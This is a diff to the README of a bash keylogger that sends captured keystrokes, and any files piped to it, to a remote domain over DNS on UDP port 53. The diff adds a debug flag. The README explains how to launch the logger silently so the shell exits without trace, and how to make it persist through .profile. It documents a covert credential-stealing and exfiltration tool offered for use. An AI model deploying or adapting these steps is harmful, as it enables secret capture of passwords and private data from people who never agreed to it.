@@ -31,15 +31,18 @@ By default, the server listens on UDP port 53. Use the `-p` flag to specify a di
 The Linux keylogger is two bash scripts. `connection.sh` is used by the `logger.sh` script to send the keystrokes to the server. If you want to manually send data, such as a file, you can pipe data to the `connection.sh` script. It will automatically establish a connection and send the data.
 ### `logger.sh`
 ```
-Usage: logger.sh [-options] domain
-Positional Arguments:
-  domain: the domain to send data to
-Options:
-  -p path: give path to log file to listen to
+# Usage: logger.sh [-options] domain
+# Positional Arguments:
+#   domain: the domain to send data to
+# Options:
+#   -p path: give path to log file to listen to
+#   -l: run the logger with warnings and errors printed
 ```
 To start the keylogger, run the command `./logger.sh [domain] &> /dev/null && exit`. This will silently start the keylogger, and any inputs typed will be sent. The `&& exit` at the end will cause the shell to close on `exit`. Without it, exiting will bring you back to the non-keylogged shell. Remove the `&> /dev/null` to display error messages.
 
 The `-p` option will specify the location of the temporary log file where all the inputs are sent to. By default, this is `/tmp/`.
+
+The `-l` option will show warnings and errors. Can be useful for debugging.
 
 `logger.sh` and `connection.sh` must be in the same directory for the keylogger to work. If you want persistance, you can add the command to `.profile` to start on every new interactive shell or on login.
 ### `connection.sh`
